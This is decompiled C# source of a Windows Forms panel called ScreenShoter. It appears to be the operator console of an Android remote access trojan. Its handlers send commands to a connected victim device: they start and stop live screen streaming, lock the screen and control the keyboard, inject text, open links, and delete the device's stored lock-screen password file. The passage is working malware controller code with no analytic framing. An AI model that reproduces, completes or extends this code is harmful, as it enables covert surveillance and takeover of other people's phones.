	// Token: 0x060007EA RID: 2026 RVA: 0x000BD5E4 File Offset: 0x000BB7E4
	private void DrakeUIAvatar4_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Ho",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007EB RID: 2027 RVA: 0x000BD70C File Offset: 0x000BB90C
	private void DrakeUIAvatar7_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>RC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007EC RID: 2028 RVA: 0x000BD834 File Offset: 0x000BBA34
	private void StopButton_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sc:off",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.toptitle.Text = "...";
				this.classClient.SendMessage(parametersObjects);
				this.StartButton.Enabled = true;
				this.StopButton.Enabled = false;
				this.toptitle.Text = " ";
				this.vewpnl.Enabled = false;
				this.Livepicbox.Enabled = false;
				this.LIVE = false;
				this.refreshtimer.Stop();
				this.PBS.Value = 0;
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007ED RID: 2029 RVA: 0x000BD9D4 File Offset: 0x000BBBD4
	private void ScreenShoter_KeyDown_1(object sender, KeyEventArgs e)
	{
		char value = Conversions.ToChar(MyProject.Computer.Keyboard.CapsLock ? Conversions.ToString(Strings.ChrW((int)e.KeyCode)) : Strings.ChrW((int)e.KeyCode).ToString().ToLower());
		Console.WriteLine("Key Pressed: " + Conversions.ToString(value));
	}

	// Token: 0x060007EE RID: 2030 RVA: 0x000BDA3C File Offset: 0x000BBC3C
	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (this.classClient != null && this.textsend.Text.Length > 0)
		{
			object[] parametersObjects = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"pst<*>",
					this.textsend.Text,
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
			this.textsend.Text = "";
		}
	}

	// Token: 0x060007EF RID: 2031 RVA: 0x000BDB70 File Offset: 0x000BBD70
	private void DrakeUIAvatar8_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>En",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007F0 RID: 2032 RVA: 0x000BDC9C File Offset: 0x000BBE9C
	private void DrakeUIAvatar9_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>LKeb",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007F1 RID: 2033 RVA: 0x000BDDC4 File Offset: 0x000BBFC4
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (this.keepmeto)
		{
			this.pinbtn.ForeColor = Color.Lime;
			IntPtr hWndInsertAfter = new IntPtr(-1);
			ScreenShoter.SetWindowPos(base.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
			this.keepmeto = false;
		}
		else
		{
			this.pinbtn.ForeColor = Color.Red;
			IntPtr hWndInsertAfter = new IntPtr(-2);
			ScreenShoter.SetWindowPos(base.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
			this.keepmeto = true;
		}
	}

	// Token: 0x060007F2 RID: 2034 RVA: 0x000BDE44 File Offset: 0x000BC044
	private void PictureBox1_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>LKen",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007F3 RID: 2035 RVA: 0x000BD5E4 File Offset: 0x000BB7E4
	private void Button6_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Ho",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007F4 RID: 2036 RVA: 0x0000206C File Offset: 0x0000026C
	private void TSwitch1_CheckedChanged(object sender, EventArgs e)
	{
	}

	// Token: 0x060007F5 RID: 2037 RVA: 0x000BD70C File Offset: 0x000BB90C
	private void Button7_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>RC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007F6 RID: 2038 RVA: 0x000BD4BC File Offset: 0x000BB6BC
	private void Button5_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Bc",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007F7 RID: 2039 RVA: 0x000BDA3C File Offset: 0x000BBC3C
	private void Enterbutton_Click(object sender, EventArgs e)
	{
		if (this.classClient != null && this.textsend.Text.Length > 0)
		{
			object[] parametersObjects = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"pst<*>",
					this.textsend.Text,
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
			this.textsend.Text = "";
		}
	}

	// Token: 0x060007F8 RID: 2040 RVA: 0x000BDF6C File Offset: 0x000BC16C
	private void pictureBox7_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"lnk<*>",
						reso.ChekLink(this.textsend.Text),
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007F9 RID: 2041 RVA: 0x000BDC9C File Offset: 0x000BBE9C
	private void PictureBox14_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>LKeb",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007FA RID: 2042 RVA: 0x000BC7E4 File Offset: 0x000BA9E4
	private void PictureBox10_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>LK",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007FB RID: 2043 RVA: 0x000BE0B4 File Offset: 0x000BC2B4
	private void PictureBox12_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>LKnn",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007FC RID: 2044 RVA: 0x000029F7 File Offset: 0x00000BF7
	private void PictureBox9_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	// Token: 0x060007FD RID: 2045 RVA: 0x000BE1DC File Offset: 0x000BC3DC
	private void PictureBox11_Click(object sender, EventArgs e)
	{
		PictureBox pictureBox = (PictureBox)sender;
		if (pictureBox.Tag == null || Convert.ToString(pictureBox.Tag) == "Unselected")
		{
			pictureBox.Tag = "Selected";
			pictureBox.BorderStyle = BorderStyle.Fixed3D;
		}
		else
		{
			pictureBox.Tag = "Unselected";
			pictureBox.BorderStyle = BorderStyle.None;
		}
		if (Convert.ToString(pictureBox.Tag) == "Selected")
		{
			this.Livepicbox.Enabled = true;
			this.LIVE = true;
			if (this.classClient == null)
			{
				return;
			}
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>SK",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		if (this.classClient != null)
		{
			try
			{
				string[] array2 = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects2 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>SK",
						Data.SPL_SOCKET,
						array2[0],
						Data.SPL_SOCKET,
						array2[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects2);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007FE RID: 2046 RVA: 0x000BE4BC File Offset: 0x000BC6BC
	private void StartButton_Click(object sender, EventArgs e)
	{
		if (this.classClient != null && !this.LIVE)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sc:on:",
						this.Qualtibox.Text,
						"~",
						this.FPSBOX.Text,
						"~",
						this.classClient.ClientRemoteAddress,
						"~",
						MySettingsProperty.Settings.resolution,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.toptitle.Text = "Connecting , Please Wait...";
				this.StartButton.Enabled = false;
				this.Guna2Button2.Enabled = true;
				this.vewpnl.Enabled = true;
				this.Livepicbox.Enabled = true;
				this.LIVE = true;
				this.refreshtimer.Enabled = true;
				this.refreshtimer.Start();
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007FF RID: 2047 RVA: 0x000BE6AC File Offset: 0x000BC8AC
	private void Guna2Button2_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sc:off",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.toptitle.Text = "...";
				this.classClient.SendMessage(parametersObjects);
				this.StartButton.Enabled = true;
				this.Guna2Button2.Enabled = false;
				this.toptitle.Text = " ";
				this.vewpnl.Enabled = false;
				this.Livepicbox.Enabled = false;
				this.LIVE = false;
				this.refreshtimer.Stop();
				this.PBS.Value = 0;
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000800 RID: 2048 RVA: 0x00002858 File Offset: 0x00000A58
	private void Guna2Button5_Click(object sender, EventArgs e)
	{
		base.Close();
	}

	// Token: 0x06000801 RID: 2049 RVA: 0x00059A1C File Offset: 0x00057C1C
	private void DrakeUILabel1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000802 RID: 2050 RVA: 0x000BE84C File Offset: 0x000BCA4C
	private void drakeUIAvatar8_Click_1(object sender, EventArgs e)
	{
		string text = "/storage/emulated/0/Config/sys/apps/loge/pwd.text";
		if (!string.IsNullOrEmpty(text))
		{
			DialogResult dialogResult = MessageBox.Show("Are you sure you want to reset previous password?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
			if (dialogResult == DialogResult.Yes)
			{
				string text2 = "del0";
				string text3 = text;
				if (this.classClient != null)
				{
					object[] parametersObjects = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient1,
							Data.SPL_SOCKET,
							reso.domen,
							".files",
							Data.SPL_SOCKET,
							"method",
							Data.SPL_SOCKET,
							SecurityKey.resultClient,
							Data.SPL_SOCKET,
							text2,
							Data.SPL_DATA,
							text3
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(parametersObjects);
				}
			}
		}
	}

	// Token: 0x04000B14 RID: 2836
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Livepicbox")]
	private PictureBox _Livepicbox;

	// Token: 0x04000B15 RID: 2837
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Save")]
	private DrakeUICheckBox _Save;

	// Token: 0x04000B16 RID: 2838
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	// Token: 0x04000B17 RID: 2839
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	// Token: 0x04000B18 RID: 2840
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel4")]
	private Panel _Panel4;

	// Token: 0x04000B19 RID: 2841
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	// Token: 0x04000B1A RID: 2842
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refreshtimer")]
	private Timer _refreshtimer;

	// Token: 0x04000B1B RID: 2843
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("presstimer")]
	private Timer _presstimer;

	// Token: 0x04000B1C RID: 2844
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	// Token: 0x04000B1D RID: 2845
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("scshotbtn")]
	private DrakeUIAvatar _scshotbtn;

	// Token: 0x04000B1E RID: 2846
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Dismisbtn")]
	private DrakeUIAvatar _Dismisbtn;

	// Token: 0x04000B1F RID: 2847
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkblock")]
	private DrakeUICheckBox _checkblock;

	// Token: 0x04000B20 RID: 2848
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("chkctrl")]
	private DrakeUICheckBox _chkctrl;

	// Token: 0x04000B21 RID: 2849
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StartButton")]
	private DrakeUIAvatar _StartButton;

	// Token: 0x04000B22 RID: 2850
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StopButton")]
	private DrakeUIAvatar _StopButton;

	// Token: 0x04000B23 RID: 2851
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar5")]
	private DrakeUIAvatar _DrakeUIAvatar5;

	// Token: 0x04000B24 RID: 2852
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar6")]
	private DrakeUIAvatar _DrakeUIAvatar6;

	// Token: 0x04000B25 RID: 2853
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar3")]
	private DrakeUIAvatar _DrakeUIAvatar3;

	// Token: 0x04000B26 RID: 2854
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar4")]
	private DrakeUIAvatar _DrakeUIAvatar4;

	// Token: 0x04000B27 RID: 2855
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar7")]
	private DrakeUIAvatar _DrakeUIAvatar7;

	// Token: 0x04000B28 RID: 2856
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	// Token: 0x04000B29 RID: 2857
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar9")]
	private DrakeUIAvatar _DrakeUIAvatar9;

	// Token: 0x04000B2A RID: 2858
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pinbtn")]
	private DrakeUIButtonIcon _pinbtn;

	// Token: 0x04000B2B RID: 2859
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	// Token: 0x04000B2C RID: 2860
	public TcpClient Client;

	// Token: 0x04000B2D RID: 2861
	public Client ScreenClass;

	// Token: 0x04000B2E RID: 2862
	public Client classClient;

	// Token: 0x04000B2F RID: 2863
	public string DownloadsFolder;

	// Token: 0x04000B30 RID: 2864
	public Size ScreenSize;

	// Token: 0x04000B31 RID: 2865
	public bool LIVE;

	// Token: 0x04000B32 RID: 2866
	public bool ScreenShotFoucs;

	// Token: 0x04000B33 RID: 2867
	public int Rnew;

	// Token: 0x04000B34 RID: 2868
	public string Title;

	// Token: 0x04000B35 RID: 2869
	private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

	// Token: 0x04000B36 RID: 2870
	private const uint SWP_NOMOVE = 2U;

	// Token: 0x04000B37 RID: 2871
	private bool @checked;

	// Token: 0x04000B38 RID: 2872
	private string[] sizearry;

	// Token: 0x04000B39 RID: 2873
	private bool Swaping;

	// Token: 0x04000B3A RID: 2874
	private bool isdown;

	// Token: 0x04000B3B RID: 2875
	private List<Point> Trakpoint;

	// Token: 0x04000B3C RID: 2876
	private bool isclick;

	// Token: 0x04000B3D RID: 2877
	public const int HT_CAPTION = 2;

	// Token: 0x04000B3E RID: 2878
	public bool recordit;

	// Token: 0x04000B3F RID: 2879
	private int tiks;

	// Token: 0x04000B40 RID: 2880
	private object iscontroled;

	// Token: 0x04000B41 RID: 2881
	private bool keepmeto;

	// Token: 0x020000BA RID: 186
	// (Invoke) Token: 0x06000805 RID: 2053
	public delegate void Delegatstoper();

	// Token: 0x020000BB RID: 187
	// (Invoke) Token: 0x06000809 RID: 2057
	public delegate void addLogback(object[] objs);
}
